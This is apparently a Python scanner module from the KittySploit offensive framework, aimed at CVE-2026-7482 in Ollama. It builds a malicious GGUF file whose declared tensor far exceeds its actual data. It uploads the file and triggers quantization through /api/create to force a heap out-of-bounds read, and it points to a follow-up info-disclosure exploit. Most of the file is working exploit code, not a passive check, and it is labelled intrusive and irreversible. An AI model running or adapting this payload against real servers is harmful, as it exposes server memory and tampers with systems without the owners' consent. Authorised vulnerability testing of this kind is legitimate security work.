#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect Ollama CVE-2026-7482 GGUF heap OOB read via malicious quantize."""

import hashlib
import json
import struct

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response
from lib.scanner.target_utils import normalize_scanner_target


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Ollama CVE-2026-7482 GGUF OOB Read Detect",
        "description": (
            "Detects CVE-2026-7482 in ollama/ollama < 0.17.1: uploads a malicious GGUF "
            "declaring a 1024×1024 F16 tensor in a ~512-byte file and triggers "
            "POST /api/create with quantize=Q8_0. Vulnerable servers return "
            "{\"status\":\"success\"} and materialize a ~1.1 MB Q8_0 layer from heap "
            "OOB reads; patched servers reject with \"exceeds file size\"."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-7482"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-7482",
            "https://www.cve.org/CVERecord?id=CVE-2026-7482",
        ],
        "modules": ["auxiliary/admin/http/ollama_cve_2026_7482_info_disclosure"],
        "tags": [
            "web",
            "scanner",
            "ollama",
            "gguf",
            "info-disclosure",
            "heap",
            "llm",
            "cve-2026-7482",
            "vuln",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.5,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["ollama"],
                "endpoint_pattern_any": ["/api/create", "/api/blobs/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "info_disclosure", "from_detail": "heap OOB via GGUF quantize"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/ollama_cve_2026_7482_info_disclosure",
                ],
            },
        },
    }

    port = OptPort(11434, "Ollama HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    create_timeout = OptInteger(
        300,
        "Timeout in seconds for streaming /api/create",
        False,
        advanced=True,
    )

    DECLARED_TENSOR_BYTES = 1024 * 1024 * 2
    EXPECTED_LAYER_BYTES = (1024 * 1024 // 32) * 34

    def _host(self) -> str:
        target = str(self.target or "").strip()
        host, _, _ = normalize_scanner_target(target)
        return host or target

    def _base_url(self) -> str:
        port = int(self.port or 11434)
        proto = "https" if self._to_bool(self.ssl) else "http"
        return f"{proto}://{self._host()}:{port}"

    def _api(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _pack_gguf_str(value: str) -> bytes:
        raw = value.encode()
        return struct.pack("<Q", len(raw)) + raw

    def _kv_uint32(self, key: str, val: int) -> bytes:
        return self._pack_gguf_str(key) + struct.pack("<I", 4) + struct.pack("<I", val)

    def _kv_float32(self, key: str, val: float) -> bytes:
        return self._pack_gguf_str(key) + struct.pack("<I", 6) + struct.pack("<f", val)

    def _kv_string(self, key: str, val: str) -> bytes:
        return self._pack_gguf_str(key) + struct.pack("<I", 8) + self._pack_gguf_str(val)

    def _build_malicious_gguf(self) -> bytes:
        magic = b"GGUF"
        version = struct.pack("<I", 3)
        tensor_count = struct.pack("<Q", 1)
        kvs = [
            self._kv_string("general.architecture", "llama"),
            self._kv_uint32("general.file_type", 1),
            self._kv_uint32("llama.context_length", 512),
            self._kv_uint32("llama.embedding_length", 1024),
            self._kv_uint32("llama.block_count", 1),
            self._kv_uint32("llama.feed_forward_length", 2048),
            self._kv_uint32("llama.attention.head_count", 8),
            self._kv_uint32("llama.attention.head_count_kv", 8),
            self._kv_float32("llama.attention.layer_norm_rms_epsilon", 1e-5),
        ]
        kv_block = b"".join(kvs)
        kv_count = struct.pack("<Q", len(kvs))
        tname = self._pack_gguf_str("blk.0.attn_q.weight")
        ndims = struct.pack("<I", 2)
        dim0 = struct.pack("<Q", 1024)
        dim1 = struct.pack("<Q", 1024)
        ttype = struct.pack("<I", 1)
        toffset = struct.pack("<Q", 0)
        header = magic + version + tensor_count + kv_count + kv_block
        header += tname + ndims + dim0 + dim1 + ttype + toffset
        pad_len = (32 - len(header) % 32) % 32
        header += b"\x00" * pad_len
        return header + (b"\x41" * 32)

    def _stream_create(self, model_name: str, sha256: str):
        url = self._base_url() + self._api("/api/create")
        body = {
            "name": model_name,
            "files": {"model.gguf": f"sha256:{sha256}"},
            "quantize": "Q8_0",
        }
        lines = []
        verify = self._to_bool(getattr(self, "verify_ssl", False))
        try:
            response = requests.post(
                url,
                json=body,
                headers={"Content-Type": "application/json"},
                stream=True,
                timeout=int(self.create_timeout or 300),
                verify=verify,
            )
            for raw in response.iter_lines(decode_unicode=True):
                line = (raw or "").strip()
                if line:
                    lines.append(line)
        except requests.RequestException as exc:
            lines.append(json.dumps({"error": str(exc)}))
        return lines

    def _evaluate(self, lines, payload_len: int):
        last = lines[-1] if lines else "{}"
        try:
            obj = json.loads(last)
        except ValueError:
            obj = {}

        if "error" in obj:
            err = str(obj["error"])
            if "exceeds file size" in err:
                return False, "patched (gguf.Decode bounds check)"
            if "data size" in err and "less than expected" in err:
                return False, "patched (unsafe.Slice guard)"
            return False, f"error: {err[:160]}"

        if obj.get("status") == "success":
            reason = (
                f"CVE-2026-7482: quantize succeeded — {payload_len}-byte GGUF produced "
                f"~{self.EXPECTED_LAYER_BYTES:,}-byte Q8_0 layer (heap OOB read)"
            )
            return True, reason

        statuses = []
        for line in lines:
            try:
                statuses.append(json.loads(line).get("status", ""))
            except ValueError:
                pass
        if any("quantizing" in s for s in statuses):
            return True, "CVE-2026-7482: quantization ran (likely heap OOB read)"
        return False, "inconclusive /api/create response"

    def run(self):
        probe = self.http_request(
            method="GET",
            path=self._api("/api/tags"),
            allow_redirects=False,
            timeout=int(self.timeout or 10),
        )
        data, err = parse_json_response(probe) if probe else (None, "bad_status")
        if err or not isinstance(data, dict) or "models" not in data:
            return False

        payload = self._build_malicious_gguf()
        sha256 = hashlib.sha256(payload).hexdigest()
        upload = self.http_request(
            method="POST",
            path=self._api(f"/api/blobs/sha256:{sha256}"),
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
            allow_redirects=False,
            timeout=120,
        )
        if not upload or int(upload.status_code or 0) not in (200, 201):
            return False

        model_name = f"cve-2026-7482-probe-{sha256[:8]}"
        lines = self._stream_create(model_name, sha256)
        ok, reason = self._evaluate(lines, len(payload))
        if not ok:
            print_status(f"CVE-2026-7482 not vulnerable: {reason}")
            return False

        print_status("CVE-2026-7482 vuln=True")
        self.set_info(
            severity="high",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-7482",
            path=self._api("/api/create"),
            model_name=model_name,
            declared_tensor_bytes=self.DECLARED_TENSOR_BYTES,
        )
        return True
